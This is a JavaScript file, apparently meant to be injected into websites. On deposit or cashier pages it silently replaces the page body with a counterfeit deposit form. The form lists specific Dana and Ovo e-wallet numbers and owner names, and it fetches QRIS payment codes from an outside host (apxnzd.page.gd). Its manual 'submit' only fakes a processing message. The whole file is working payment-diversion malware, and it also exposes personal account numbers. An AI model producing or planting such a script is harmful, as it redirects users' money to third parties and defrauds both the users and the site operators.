(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  if (!match.some(path => url.includes(path))) {
    console.log("[indexkuy.js] URL tidak cocok, halaman tidak diubah.");
    return;
  }

  console.log("[indexkuy.js] URL cocok, mengganti body...");

  document.body.innerHTML = `
<style>
  :root{--bg:#eef2f6;--card:#fff;--muted:#6b7280;--primary:#1f6feb;--success:#16a34a;--radius:12px;}
  body{margin:0;font-family:'Poppins',sans-serif;background:var(--bg);color:#111827;display:flex;justify-content:center;align-items:flex-start;padding:18px 12px;min-height:100vh}
  .page{width:100%;max-width:760px}
  h1{margin:0;font-size:24px;color:#0f172a;font-weight:600;text-align:center}
  .card{background:var(--card);border-radius:var(--radius);box-shadow:0 8px 24px rgba(15,23,42,0.06);padding:18px}
  .marquee{font-size:13px;color:var(--muted);overflow:hidden;white-space:nowrap;display:block;padding:8px 0;border-bottom:1px solid rgba(15,23,42,0.04);margin-bottom:14px}
  .marquee>span{display:inline-block;padding-left:100%;animation:marquee 14s linear infinite}
  @keyframes marquee{0%{transform:translateX(0)}100%{transform:translateX(-100%)}}
  .actions{display:flex;gap:10px;margin:12px 0;flex-wrap:wrap}
  .btn{background:var(--primary);color:#fff;border:none;padding:10px 14px;border-radius:10px;cursor:pointer;font-weight:600;font-size:14px;box-shadow:0 6px 14px rgba(31,111,235,0.12)}
  .btn.secondary{background:var(--success)}
  select,input[type=number],textarea{width:100%;padding:12px 14px;border-radius:10px;border:1px solid rgba(15,23,42,0.08);font-size:15px;background:#fff;margin-top:10px;color:#0f172a}
  textarea{min-height:90px;resize:vertical}
  .bank-info{margin-top:12px;padding:14px;border-radius:10px;background:#f8fafc;display:flex;gap:12px;align-items:center;border:1px solid rgba(15,23,42,0.03)}
  .bank-info img{width:64px;height:64px;object-fit:contain;border-radius:8px}
  .bank-meta{flex:1}.bank-meta .name{font-weight:600;font-size:16px;margin-bottom:4px;color:#0f172a}
  .bank-meta .number{font-size:15px;color:#111827;letter-spacing:.6px}
  .bank-meta .owner{display:block;margin-top:6px;color:var(--muted);font-size:13px}
  .result-area{text-align:center;margin-top:14px}
  .qr-card{display:inline-block;padding:10px;background:#fff;border-radius:12px;box-shadow:0 6px 18px rgba(2,6,23,0.06)}
  .spinner{width:36px;height:36px;border-radius:50%;border:4px solid rgba(0,0,0,0.06);border-top-color:var(--primary);animation:spin 1s linear infinite;margin:10px auto}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>

<div class="page">
  <h1>Formulir Deposit</h1>
  <div class="card">
    <div class="marquee"><span>Selamat datang di situs kami. Harap perhatikan tujuan deposit — wajib sesuai formulir deposit.</span></div>
    <div class="actions">
      <button class="btn" onclick="showDeposit('manual')">Manual Deposit</button>
      <button class="btn secondary" onclick="showDeposit('auto')">Otomatis Deposit (QRIS)</button>
    </div>

    <div id="manual-step" style="display:none;">
      <label class="helper">Pilih Metode Deposit</label>
      <select onchange="selectMethod(this.value)">
        <option value="" selected disabled>Pilih Metode Deposit</option>
        <option value='{"logo":"https://...","name":"Dana","number":"088214538915","owner":"SURWATI"}'>Dana</option>
        <option value='{"logo":"https://...","name":"Ovo","number":"088905200893","owner":"ENJAH"}'>Ovo</option>
      </select>
      <div id="manual-details" class="bank-info" style="display:none">
        <img id="bank-logo" src="" alt="Bank Logo" />
        <div class="bank-meta">
          <div class="name" id="bank-name"></div>
          <div class="number" id="bank-number"></div>
          <div class="owner" id="bank-owner"></div>
        </div>
        <button class="btn" onclick="copyToClipboard(document.getElementById('bank-number').innerText)">Salin</button>
        <input id="manual-nominal" type="number" min="50000" placeholder="Nominal Deposit (min. 50.000)" />
        <textarea id="manual-note" placeholder="Catatan (opsional)"></textarea>
        <button class="btn" onclick="submitManualDeposit()">Submit</button>
        <div id="manual-result" class="helper"></div>
      </div>
    </div>

    <div id="auto-deposit" style="display:none;">
      <label class="helper">Nominal minimal 50.000</label>
      <input id="nominal" type="number" min="50000" placeholder="Nominal" />
      <button class="btn" onclick="generateQRIS()">Submit</button>
      <div id="auto-result" class="result-area"></div>
    </div>
  </div>
</div>
`;

  // === fungsi dibuat global ===
  window.copyToClipboard = function(text) {
    navigator.clipboard.writeText(text).then(()=>alert('Nomor berhasil disalin!'));
  }

  window.showDeposit = function(type){
    document.getElementById('manual-step').style.display = type==='manual'?'block':'none';
    document.getElementById('auto-deposit').style.display = type==='auto'?'block':'none';
  }

  window.selectMethod = function(j){
    if(!j) return;
    try{
      const m = JSON.parse(j);
      document.getElementById('manual-details').style.display = 'flex';
      document.getElementById('bank-logo').src = m.logo;
      document.getElementById('bank-name').innerText = m.name;
      document.getElementById('bank-number').innerText = m.number;
      document.getElementById('bank-owner').innerText = m.owner;
    }catch(e){ console.error('parse error', e); }
  }

  window.submitManualDeposit = function(){
    const n = Number(document.getElementById('manual-nominal').value||0);
    if(n<50000){alert('Minimal deposit 50.000');return;}
    document.getElementById('manual-result').innerHTML='<div class="spinner"></div><div>Processing...</div>';
    setTimeout(()=>{document.getElementById('manual-result').innerHTML='<strong>Deposit In Progress</strong>';setTimeout(()=>location.href='../',1500)},1500);
  }

  window.generateQRIS = async function(){
    const n=Number(document.getElementById('nominal').value||0);
    if(n<50000){alert('Minimal 50.000');return;}
    document.getElementById('auto-result').innerHTML='<div class="spinner"></div><div>Membuat QRIS...</div>';
    const p='qris=000201010212...&qty='+encodeURIComponent(n)+'&yn=n';
    try{
      const r=await fetch('https://apxnzd.page.gd/qris.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:p});
      console.log('[QRIS] Status:',r.status);
      const t=await r.text();
      console.log('[QRIS] Response:',t);
      const u='https://api.qrserver.com/v1/create-qr-code/?size=300x300&data='+encodeURIComponent(t);
      document.getElementById('auto-result').innerHTML='<div class="qr-card"><img id="qr-img" src="'+u+'" style="width:220px;height:220px;border-radius:10px;"></div><button class="btn" onclick="downloadQR()">Download</button>';
    }catch(e){
      console.error('[QRIS] Fetch error',e);
      document.getElementById('auto-result').innerHTML='<div>Gagal membuat QRIS.</div>';
    }
  }

  window.downloadQR = function(){
    const img=document.getElementById('qr-img');if(!img)return;
    const link=document.createElement('a');link.href=img.src;link.download='qris.png';
    document.body.appendChild(link);link.click();link.remove();
  }
})();
